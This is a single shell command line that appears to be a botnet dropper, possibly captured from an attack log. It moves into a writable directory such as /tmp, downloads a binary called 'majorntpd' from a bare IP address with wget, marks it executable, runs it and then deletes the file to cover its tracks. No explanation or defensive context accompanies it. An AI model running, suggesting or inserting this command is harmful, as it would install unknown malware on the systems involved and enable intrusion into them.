cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.161.227/majorntpd; chmod +x majorntpd; ./majorntpd; rm -rf majorntpd
